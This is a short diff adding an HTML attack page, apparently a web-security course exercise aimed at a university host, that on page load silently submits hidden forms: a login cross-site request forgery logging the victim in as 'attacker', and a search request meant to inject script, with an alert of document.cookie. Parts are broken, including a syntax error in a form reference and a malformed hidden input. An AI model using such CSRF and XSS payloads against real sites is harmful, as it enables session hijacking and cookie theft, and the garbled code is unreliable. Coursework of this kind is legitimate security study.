@@ -1,0 +1,21 @@
+<script> 
+	window.onload = function(){
+		document.forms['search'].submit();
+		document.forms['hacks'dd].submit();
+		alert(document.cookie);
+	}
+</script> 
+<style type="text/css">
+iframe {display:none;}
+</style>
+<form method="POST" action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" id="hacks" target="hidden_iframe">
+  <input type="hidden" name="username" value="attacker">
+  <input type="hidden" name="password" value="l33th4x">
+  <input type="submit">
+</form>
+<iframe src="" name="hidden_iframe" id="hidden_iframe"></iframe>
+<form method="POST" action="http://trurl.cs.illinois.edu/search" id="search" target="hidden_iframe2">
+<input type="submit">
+<input type="hidden" q="document.body.innerHTML + <script>">
+</form>
+<iframe src="" name="hidden_iframe2" id="hidden_iframe2"></iframe>
